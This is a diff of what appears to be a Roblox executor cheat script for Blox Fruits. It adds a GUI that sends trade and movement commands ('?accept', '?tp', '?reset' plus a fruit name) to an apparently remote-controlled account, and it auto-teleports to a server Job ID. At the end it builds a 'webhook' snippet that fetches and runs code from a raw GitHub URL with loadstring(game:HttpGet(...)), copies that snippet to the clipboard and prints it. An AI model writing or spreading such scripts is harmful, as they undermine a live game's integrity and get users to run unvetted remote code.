+    AcceptButton.Font = Enum.Font.GothamBold
+    AcceptButton.TextSize = 14
+    AcceptButton.Parent = TradeFrame
+    
+    local AcceptCorner = Instance.new("UICorner")
+    AcceptCorner.CornerRadius = UDim.new(0, 6)
+    AcceptCorner.Parent = AcceptButton
+    
+    -- CONTROL COMMANDS SECTION
+    local ControlFrame = Instance.new("Frame")
+    ControlFrame.Size = UDim2.new(1, -20, 0, 120)
+    ControlFrame.Position = UDim2.new(0, 10, 0, 245)
+    ControlFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
+    ControlFrame.Parent = MainFrame
+    
+    local ControlCorner = Instance.new("UICorner")
+    ControlCorner.CornerRadius = UDim.new(0, 8)
+    ControlCorner.Parent = ControlFrame
+    
+    local ControlLabel = Instance.new("TextLabel")
+    ControlLabel.Size = UDim2.new(1, 0, 0, 25)
+    ControlLabel.Position = UDim2.new(0, 0, 0, 0)
+    ControlLabel.BackgroundTransparency = 1
+    ControlLabel.Text = "CONTROL COMMANDS"
+    ControlLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
+    ControlLabel.Font = Enum.Font.GothamBold
+    ControlLabel.TextSize = 12
+    ControlLabel.Parent = ControlFrame
+    
+    -- Control Buttons Grid
+    local ControlGrid = Instance.new("UIGridLayout")
+    ControlGrid.CellSize = UDim2.new(0.48, 0, 0, 35)
+    ControlGrid.CellPadding = UDim2.new(0, 5, 0, 5)
+    ControlGrid.StartCorner = Enum.StartCorner.TopLeft
+    ControlGrid.Parent = ControlFrame
+    
+    local JumpButton = Instance.new("TextButton")
+    JumpButton.BackgroundColor3 = Color3.fromRGB(255, 140, 0)
+    JumpButton.Text = "JUMP"
+    JumpButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    JumpButton.Font = Enum.Font.GothamBold
+    JumpButton.TextSize = 13
+    JumpButton.Parent = ControlFrame
+    
+    local TpButton = Instance.new("TextButton")
+    TpButton.BackgroundColor3 = Color3.fromRGB(255, 140, 0)
+    TpButton.Text = "TP"
+    TpButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    TpButton.Font = Enum.Font.GothamBold
+    TpButton.TextSize = 13
+    TpButton.Parent = ControlFrame
+    
+    local TestButton = Instance.new("TextButton")
+    TestButton.BackgroundColor3 = Color3.fromRGB(255, 140, 0)
+    TestButton.Text = "TEST"
+    TestButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    TestButton.Font = Enum.Font.GothamBold
+    TestButton.TextSize = 13
+    TestButton.Parent = ControlFrame
+    
+    -- Reset Fruit Input
+    local ResetInput = Instance.new("TextBox")
+    ResetInput.Size = UDim2.new(0.6, 0, 0, 30)
+    ResetInput.Position = UDim2.new(0.02, 0, 0.75, 0)
+    ResetInput.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
+    ResetInput.Text = ""
+    ResetInput.PlaceholderText = "Fruit for reset"
+    ResetInput.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
+    ResetInput.TextColor3 = Color3.fromRGB(255, 255, 255)
+    ResetInput.Font = Enum.Font.Gotham
+    ResetInput.TextSize = 11
+    ResetInput.Parent = ControlFrame
+    
+    local ResetInputCorner = Instance.new("UICorner")
+    ResetInputCorner.CornerRadius = UDim.new(0, 6)
+    ResetInputCorner.Parent = ResetInput
+    
+    local ResetButton = Instance.new("TextButton")
+    ResetButton.Size = UDim2.new(0.35, 0, 0, 30)
+    ResetButton.Position = UDim2.new(0.63, 0, 0.75, 0)
+    ResetButton.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
+    ResetButton.Text = "RESET"
+    ResetButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    ResetButton.Font = Enum.Font.GothamBold
+    ResetButton.TextSize = 12
+    ResetButton.Parent = ControlFrame
+    
+    local ResetCorner = Instance.new("UICorner")
+    ResetCorner.CornerRadius = UDim.new(0, 6)
+    ResetCorner.Parent = ResetButton
+    
+    -- BUTTON FUNCTIONALITY
+    CloseButton.MouseButton1Click:Connect(function()
+        ScreenGui:Destroy()
+    end)
+    
+    AddButton.MouseButton1Click:Connect(function()
+        local fruit = FruitInput.Text:lower()
+        if fruit ~= "" then
+            executeCommand("+" .. fruit)
+        end
+    end)
+    
+    RemoveButton.MouseButton1Click:Connect(function()
+        local fruit = FruitInput.Text:lower()
+        if fruit ~= "" then
+            executeCommand("-" .. fruit)
+        end
+    end)
+    
+    AcceptButton.MouseButton1Click:Connect(function()
+        executeCommand("?accept")
+    end)
+    
+    JumpButton.MouseButton1Click:Connect(function()
+        executeCommand("?jump")
+    end)
+    
+    TpButton.MouseButton1Click:Connect(function()
+        executeCommand("?tp")
+    end)
+    
+    TestButton.MouseButton1Click:Connect(function()
+        executeCommand("?test")
+    end)
+    
+    ResetButton.MouseButton1Click:Connect(function()
+        local fruit = ResetInput.Text:lower()
+        if fruit ~= "" then
+            executeCommand("?reset " .. fruit)
+        end
+    end)
+    
+    -- Auto focus on input
+    FruitInput:CaptureFocus()
+end
+
+-- MAIN EXECUTION
 task.spawn(function()
+    -- Wait for game to load
+    task.wait(2)
+    
+    -- First, auto teleport to the Job ID
+    autoTeleport()
+    
+    -- Then wait a bit and show command UI
     task.wait(5)
-    -- Check if we're in a game server (not menu)
-    if game.PlaceId == SEA_PLACE["1"] or game.PlaceId == SEA_PLACE["2"] or game.PlaceId == SEA_PLACE["3"] then
+    
+    -- Check if we're in a game server
+    local currentPlace = game.PlaceId
+    if currentPlace == SEA_PLACE["1"] or currentPlace == SEA_PLACE["2"] or currentPlace == SEA_PLACE["3"] then
         createCommandGUI()
+    else
+        -- If not in game yet, check again after 10 seconds
+        task.wait(10)
+        local newPlace = game.PlaceId
+        if newPlace == SEA_PLACE["1"] or newPlace == SEA_PLACE["2"] or newPlace == SEA_PLACE["3"] then
+            createCommandGUI()
+        end
     end
 end)
+
+-- Function to get the code for sending to webhook
+local function getWebhookCode()
+    local currentJobId = game.JobId
+    local code = string.format([[
+JOBID = "%s"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NeroHubClub/TP-BF-NERO/refs/heads/main/NANANNAA"))()
+    ]], currentJobId)
+    
+    -- Copy to clipboard
+    pcall(function()
+        setclipboard(code)
+    end)
+    
+    return code
+end
+
+-- Auto-copy code when script executes
+task.wait(3)
+local webhookCode = getWebhookCode()
+print("=================================")
+print("COPY THIS CODE FOR WEBHOOK:")
+print("=================================")
+print(webhookCode)
+print("=================================")
+print("Code has been copied to clipboard!")
+print("=================================")
